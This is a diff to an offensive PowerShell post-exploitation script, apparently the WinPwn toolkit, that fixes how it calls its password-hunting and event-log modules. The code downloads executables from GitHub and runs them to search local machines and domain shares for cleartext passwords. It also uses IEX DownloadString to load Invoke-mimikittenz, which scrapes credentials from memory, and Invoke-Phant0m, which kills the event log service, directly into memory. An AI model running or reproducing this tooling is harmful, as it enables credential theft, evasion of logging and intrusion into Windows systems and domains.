@@ -293,8 +293,8 @@ function localreconmodules
             Write-Host -ForegroundColor Yellow 'Parsing Event logs for sensitive Information:'
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
             Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/EventLogParser.exe' -Outfile "$currentPath\EventLogParser.exe"
-            EventLogParser.exe eventid=4103 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
-            EventLogParser.exe eventid=4104 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
+            $currentPath\EventLogParser.exe eventid=4103 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
+            $currentPath\EventLogParser.exe eventid=4104 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
             if (isadmin){EventLogParser.exe eventid=4688 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"}
 
 
@@ -336,7 +336,7 @@ function localreconmodules
             $passhunt = Read-Host -Prompt 'Do you want to search for Passwords on this system using passhunt.exe? (Its worth it) (yes/no)'
             if ($passhunt -eq "yes" -or $passhunt -eq "y" -or $passhunt -eq "Yes" -or $passhunt -eq "Y")
             {
-                passhunt -local
+                passhunt -local $true
             }
             
             # Collecting more information
@@ -446,10 +446,10 @@ function passhunt
     #Local/Domain Recon / Privesc
     Param
     (
-        [String]
+        [bool]
         $local,
 
-        [string]
+        [bool]
         $domain
     )
     pathcheck
@@ -490,11 +490,9 @@ function passhunt
         }
         if ($local)
         {
-            if (test-path $currentPath\passhunt.exe)
-            {
-                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-                Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
-            }
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
+            
             cmd /c start powershell -Command "$currentPath\passhunt.exe"
             $sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'
             if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
@@ -510,11 +508,8 @@ function passhunt
         }
         else
         {
-            if (test-path $currentPath\passhunt.exe)
-            {
-                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-                Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
-            }
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
             cmd /c start powershell -Command "$currentPath\passhunt.exe"
         }
 
@@ -672,7 +667,7 @@ function domainreconmodules
 	    $domainsharepass = Read-Host -Prompt 'Check Domain Network-Shares for cleartext passwords using passhunt.exe? (yes/no)'
             if ($domainsharepass -eq "yes" -or $domainsharepass -eq "y" -or $domainsharepass -eq "Yes" -or $domainsharepass -eq "Y")
             {
-                passhunt -domain
+                passhunt -domain $true
             }
 	    
             Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
@@ -1057,7 +1052,7 @@ function WinPwn
     Write-Host -ForegroundColor Yellow 'Getting Scripts to Memory'
     
     dependencychecks        
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-Mimikittenz.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-mimikittenz.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-Phant0m.ps1')
       
     if (isadmin)
